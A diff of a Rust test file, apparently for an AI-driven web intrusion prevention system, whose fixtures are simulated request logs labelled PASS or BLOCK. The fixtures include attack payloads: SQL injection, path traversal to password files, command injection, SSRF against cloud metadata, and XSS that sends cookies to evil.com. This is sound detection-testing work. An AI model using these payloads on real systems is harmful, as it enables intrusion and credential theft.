@@ -284,17 +284,20 @@ fn model_path() -> String {
     std::env::var("IPS_MODEL_PATH").unwrap_or_else(|_| DEFAULT_MODEL_PATH.to_owned())
 }
 
+/// Строка события: `METHOD path status | UA: …` и опционально `| H: …` —
+/// согласовано с `ingestion::LogEvent::compact_summary`.
+/// Часть строк содержит digest заголовков, часть — нет (как в реальном потоке).
 fn threat_cases() -> Vec<ThreatCase> {
     vec![
         // ===== BASELINE (совпадают с few-shot примерами в промпте) =====
         ThreatCase {
             ip: "192.168.1.50",
             events: vec![
-                "/index.html 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
-                "/about 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
-                "/style.css 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
-                "/contact 404 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
-                "/favicon.ico 404 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
+                "GET /index.html 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 | H: Accept: text/html,application/xhtml+xml; Accept-Language: ru-RU,en;q=0.9; Sec-Fetch-Mode: navigate",
+                "GET /about 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
+                "GET /style.css 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 | H: Accept: text/css,*/*;q=0.1; Sec-Fetch-Dest: style",
+                "GET /contact 404 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
+                "GET /favicon.ico 404 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
             ],
             expected_action: "PASS",
             ua_rotation: false,
@@ -304,11 +307,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "10.0.0.55",
             events: vec![
-                "/page?id=1' UNION SELECT username,password FROM users-- 403 | UA: sqlmap/1.8.1#stable",
-                "/search?q=1 OR 1=1 500 | UA: sqlmap/1.8.1#stable",
-                "/login?user=admin'-- 403 | UA: sqlmap/1.8.1#stable",
-                "/api?token=1; DROP TABLE sessions 500 | UA: sqlmap/1.8.1#stable",
-                "/page?id=1' AND 1=1-- 403 | UA: sqlmap/1.8.1#stable",
+                "GET /page?id=1' UNION SELECT username,password FROM users-- 403 | UA: sqlmap/1.8.1#stable",
+                "GET /search?q=1 OR 1=1 500 | UA: sqlmap/1.8.1#stable",
+                "GET /login?user=admin'-- 403 | UA: sqlmap/1.8.1#stable",
+                "GET /api?token=1; DROP TABLE sessions 500 | UA: sqlmap/1.8.1#stable",
+                "GET /page?id=1' AND 1=1-- 403 | UA: sqlmap/1.8.1#stable",
             ],
             expected_action: "BLOCK",
             ua_rotation: false,
@@ -318,11 +321,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "172.16.0.10",
             events: vec![
-                "/page?file=../../../../etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
-                "/download?path=..%2F..%2Fetc%2Fshadow 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
-                "/include?page=....//....//etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
-                "/view?doc=../../../windows/system32/config/sam 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
-                "/read?file=/proc/self/environ 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
+                "GET /page?file=../../../../etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1) | H: Accept: */*; Connection: keep-alive",
+                "GET /download?path=..%2F..%2Fetc%2Fshadow 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1) | H: Accept: */*; Connection: keep-alive",
+                "GET /include?page=....//....//etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1) | H: Accept: */*; Connection: keep-alive",
+                "GET /view?doc=../../../windows/system32/config/sam 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1) | H: Accept: */*; Connection: keep-alive",
+                "GET /read?file=/proc/self/environ 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1) | H: Accept: */*; Connection: keep-alive",
             ],
             expected_action: "BLOCK",
             ua_rotation: false,
@@ -332,10 +335,10 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "203.0.113.42",
             events: vec![
+                "POST /login 401 | UA: python-requests/2.31.0 | H: Content-Type: application/x-www-form-urlencoded; Accept: */*",
                 "POST /login 401 | UA: python-requests/2.31.0",
                 "POST /login 401 | UA: python-requests/2.31.0",
-                "POST /login 401 | UA: python-requests/2.31.0",
-                "POST /login 401 | UA: python-requests/2.31.0",
+                "POST /login 401 | UA: python-requests/2.31.0 | H: Content-Type: application/x-www-form-urlencoded; Accept: */*",
                 "POST /login 401 | UA: python-requests/2.31.0",
             ],
             expected_action: "BLOCK",
@@ -346,11 +349,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "198.51.100.8",
             events: vec![
-                "/admin 404 | UA: sqlmap/1.8.1#stable",
-                "/phpmyadmin 404 | UA: sqlmap/1.8.1#stable",
-                "/wp-admin 404 | UA: sqlmap/1.8.1#stable",
-                "/manager 404 | UA: sqlmap/1.8.1#stable",
-                "/.env 404 | UA: sqlmap/1.8.1#stable",
+                "GET /admin 404 | UA: sqlmap/1.8.1#stable",
+                "GET /phpmyadmin 404 | UA: sqlmap/1.8.1#stable",
+                "GET /wp-admin 404 | UA: sqlmap/1.8.1#stable",
+                "GET /manager 404 | UA: sqlmap/1.8.1#stable",
+                "GET /.env 404 | UA: sqlmap/1.8.1#stable",
             ],
             expected_action: "BLOCK",
             ua_rotation: false,
@@ -360,11 +363,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "45.33.32.156",
             events: vec![
-                "/login 401 | UA: Mozilla/5.0 Chrome/120.0",
-                "/login 401 | UA: python-requests/2.31.0",
-                "/login 401 | UA: curl/8.4.0",
-                "/admin 403 | UA: Go-http-client/1.1",
-                "/wp-login.php 404 | UA: Mozilla/4.0 (compatible; MSIE 6.0)",
+                "GET /login 401 | UA: Mozilla/5.0 Chrome/120.0 | H: Accept: text/html,application/xhtml+xml; Accept-Language: en-US,en;q=0.9",
+                "GET /login 401 | UA: python-requests/2.31.0",
+                "GET /login 401 | UA: curl/8.4.0",
+                "GET /admin 403 | UA: Go-http-client/1.1",
+                "GET /wp-login.php 404 | UA: Mozilla/4.0 (compatible; MSIE 6.0) | H: Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*",
             ],
             expected_action: "BLOCK",
             ua_rotation: true,
@@ -378,10 +381,10 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "185.220.101.34",
             events: vec![
-                "/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
-                "/comment?body=<img src=x onerror=alert(1)> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
-                "/profile?name=<svg/onload=fetch('http://evil.com/'+document.cookie)> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
-                "/guestbook?msg=<iframe src=javascript:alert('XSS')> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
+                "GET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
+                "GET /comment?body=<img src=x onerror=alert(1)> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0 | H: Accept: text/html; Content-Type: application/x-www-form-urlencoded",
+                "GET /profile?name=<svg/onload=fetch('http://evil.com/'+document.cookie)> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
+                "GET /guestbook?msg=<iframe src=javascript:alert('XSS')> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0 | H: Accept: text/html; Content-Type: application/x-www-form-urlencoded",
             ],
             expected_action: "BLOCK",
             ua_rotation: false,
@@ -393,11 +396,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "91.240.118.200",
             events: vec![
-                "/ping?host=127.0.0.1;cat /etc/passwd 500 | UA: curl/7.88.1",
-                "/dns?domain=example.com|whoami 500 | UA: curl/7.88.1",
-                "/exec?cmd=ls%20-la%20/tmp 403 | UA: curl/7.88.1",
-                "/shell?input=$(id) 403 | UA: curl/7.88.1",
-                "/api/run?payload=`uname -a` 500 | UA: curl/7.88.1",
+                "GET /ping?host=127.0.0.1;cat /etc/passwd 500 | UA: curl/7.88.1",
+                "GET /dns?domain=example.com|whoami 500 | UA: curl/7.88.1",
+                "GET /exec?cmd=ls%20-la%20/tmp 403 | UA: curl/7.88.1",
+                "GET /shell?input=$(id) 403 | UA: curl/7.88.1",
+                "GET /api/run?payload=`uname -a` 500 | UA: curl/7.88.1",
             ],
             expected_action: "BLOCK",
             ua_rotation: false,
@@ -409,11 +412,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "10.20.30.40",
             events: vec![
-                "GET /api/v1/products 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
-                "GET /api/v1/products/42 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
-                "POST /api/v1/cart 201 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
-                "GET /api/v1/cart 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
-                "DELETE /api/v1/cart/item/7 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
+                "GET /api/v1/products 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: application/json; Content-Type: application/json; X-Request-Id: req-a1b2c3",
+                "GET /api/v1/products/42 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: application/json; Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+                "POST /api/v1/cart 201 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Content-Type: application/json; Accept: application/json; X-Request-Id: req-d4e5f6",
+                "GET /api/v1/cart 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: application/json; Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+                "DELETE /api/v1/cart/item/7 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: application/json; Content-Type: application/json; X-Request-Id: req-g7h8i9",
             ],
             expected_action: "PASS",
             ua_rotation: false,
@@ -425,10 +428,10 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "66.249.66.1",
             events: vec![
-                "GET /robots.txt 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+                "GET /robots.txt 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) | H: Accept: text/plain; From: googlebot(at)googlebot.com",
                 "GET /sitemap.xml 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                 "GET /products 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-                "GET /about 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+                "GET /about 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) | H: Accept: text/html; From: googlebot(at)googlebot.com",
                 "GET /blog/post-1 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
             ],
             expected_action: "PASS",
@@ -441,13 +444,13 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "178.62.45.99",
             events: vec![
-                "/backup 404 | UA: gobuster/3.6",
-                "/config 404 | UA: gobuster/3.6",
-                "/database 404 | UA: gobuster/3.6",
-                "/secret 404 | UA: gobuster/3.6",
-                "/internal 404 | UA: gobuster/3.6",
-                "/debug 404 | UA: gobuster/3.6",
-                "/test 404 | UA: gobuster/3.6",
+                "GET /backup 404 | UA: gobuster/3.6",
+                "GET /config 404 | UA: gobuster/3.6",
+                "GET /database 404 | UA: gobuster/3.6",
+                "GET /secret 404 | UA: gobuster/3.6",
+                "GET /internal 404 | UA: gobuster/3.6",
+                "GET /debug 404 | UA: gobuster/3.6",
+                "GET /test 404 | UA: gobuster/3.6",
             ],
             expected_action: "BLOCK",
             ua_rotation: false,
@@ -459,13 +462,13 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "23.94.12.77",
             events: vec![
-                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
+                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0 | H: Content-Type: application/json; Accept: application/json; Origin: https://app.example.com",
                 "POST /api/auth/login 401 | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1",
                 "POST /api/auth/login 401 | UA: Mozilla/5.0 (Linux; Android 14) Chrome/120.0",
-                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Windows NT 10.0; rv:121.0) Gecko/20100101 Firefox/121.0",
+                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Windows NT 10.0; rv:121.0) Gecko/20100101 Firefox/121.0 | H: Content-Type: application/json; Accept: application/json",
                 "POST /api/auth/login 401 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15",
                 "POST /api/auth/login 401 | UA: Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0",
-                "POST /api/auth/login 401 | UA: python-requests/2.31.0",
+                "POST /api/auth/login 401 | UA: python-requests/2.31.0 | H: Content-Type: application/json; Accept: */*; Connection: keep-alive",
             ],
             expected_action: "BLOCK",
             ua_rotation: true,
@@ -477,11 +480,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "104.248.33.91",
             events: vec![
-                "/proxy?url=http://169.254.169.254/latest/meta-data/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
-                "/fetch?target=http://localhost:6379/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
-                "/redirect?to=http://127.0.0.1:8080/admin 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
-                "/load?src=http://0.0.0.0:22/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
-                "/api/fetch?endpoint=http://169.254.169.254/latest/api/token 403 | UA: curl/8.4.0",
+                "GET /proxy?url=http://169.254.169.254/latest/meta-data/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Mode: navigate",
+                "GET /fetch?target=http://localhost:6379/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
+                "GET /redirect?to=http://127.0.0.1:8080/admin 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
+                "GET /load?src=http://0.0.0.0:22/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Mode: navigate",
+                "GET /api/fetch?endpoint=http://169.254.169.254/latest/api/token 403 | UA: curl/8.4.0",
             ],
             expected_action: "BLOCK",
             ua_rotation: true,
@@ -493,11 +496,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "192.168.5.100",
             events: vec![
-                "GET / 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
+                "GET / 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                 "GET /products 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                 "GET /products/999 404 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                 "GET /products/42 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
-                "POST /products/42/review 201 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
+                "POST /products/42/review 201 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 | H: Content-Type: application/json; Accept: application/json; Origin: https://shop.example.com",
             ],
             expected_action: "PASS",
             ua_rotation: false,
@@ -508,11 +511,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "103.77.192.44",
             events: vec![
-                "GET /api/v1/profile?id=842 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
+                "GET /api/v1/profile?id=842 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: application/json; Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
                 "GET /fetch?url=http://127.0.0.1:2375/version 403 | UA: curl/8.5.0",
                 "GET /image?src=http://169.254.169.254/latest/meta-data/iam/security-credentials/ 403 | UA: python-requests/2.31.0",
                 "GET /export?file=..%2F..%2F..%2Fetc%2Fpasswd 403 | UA: Go-http-client/1.1",
-                "GET /api/v1/profile?id=843 200 | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15",
+                "GET /api/v1/profile?id=843 200 | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 | H: Accept: application/json; Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
                 "GET /proxy?target=http://localhost:6379/INFO 403 | UA: Wget/1.21.4",
             ],
             expected_action: "BLOCK",
@@ -524,7 +527,7 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "185.141.88.17",
             events: vec![
-                "GET /catalog?page=1 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
+                "GET /catalog?page=1 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: text/html,application/xhtml+xml; Accept-Language: en-US,en;q=0.9",
                 "GET /search?q=' UNION SELECT user,password FROM users-- 500 | UA: python-requests/2.31.0",
                 "POST /login 401 | UA: curl/8.5.0",
                 "GET /download?file=..%2F..%2Fetc%2Fpasswd 403 | UA: sqlmap/1.8.2#stable",
@@ -539,11 +542,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "192.168.10.77",
             events: vec![
-                "GET /home 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
-                "GET /catalog/laptops 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
-                "GET /product/lenovo-thinkpad 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
-                "POST /cart 201 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
-                "GET /checkout 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
+                "GET /home 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: text/html,application/xhtml+xml; Accept-Language: ru-RU,en;q=0.9",
+                "GET /catalog/laptops 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
+                "GET /product/lenovo-thinkpad 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
+                "POST /cart 201 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Content-Type: application/json; Accept: application/json; Origin: https://shop.example.com",
+                "GET /checkout 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
             ],
             expected_action: "PASS",
             ua_rotation: false,
@@ -557,10 +560,10 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "10.11.12.13",
             events: vec![
-                "GET /reports?status=SELECTED&year=2024 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
+                "GET /reports?status=SELECTED&year=2024 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 | H: Accept: text/html,application/xhtml+xml; Accept-Language: en-US,en;q=0.9",
                 "GET /reports/export?columns=SELECTED,name,date 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                 "GET /dashboard 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
-                "GET /settings 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
+                "GET /settings 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
             ],
             expected_action: "PASS",
             ua_rotation: false,
@@ -572,10 +575,10 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "172.20.30.40",
             events: vec![
-                "POST /login 401 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
+                "POST /login 401 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Content-Type: application/x-www-form-urlencoded; Accept: text/html,application/xhtml+xml; Origin: https://example.com",
                 "POST /login 401 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                 "GET / 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
-                "GET /help 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
+                "GET /help 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
             ],
             expected_action: "PASS",
             ua_rotation: false,
@@ -587,11 +590,11 @@ fn threat_cases() -> Vec<ThreatCase> {
         ThreatCase {
             ip: "198.18.0.50",
             events: vec![
-                "GET /news 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
+                "GET /news 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0 | H: Accept: text/html,application/xhtml+xml; Accept-Language: ru-RU,en;q=0.9",
                 "GET /article/42 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
                 "HEAD /article/42 200 | UA: curl/8.5.0",
                 "GET /contact 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
-                "GET /about 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
+                "GET /about 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
             ],
             expected_action: "PASS",
             ua_rotation: false,
@@ -604,7 +607,7 @@ fn threat_cases() -> Vec<ThreatCase> {
             ip: "10.99.1.2",
             events: vec![
                 "GET /docs/../docs/install 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
-                "GET /static/app.js 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
+                "GET /static/app.js 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0 | H: Accept: */*; Sec-Fetch-Dest: script",
                 "GET /api/health 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
             ],
             expected_action: "PASS",
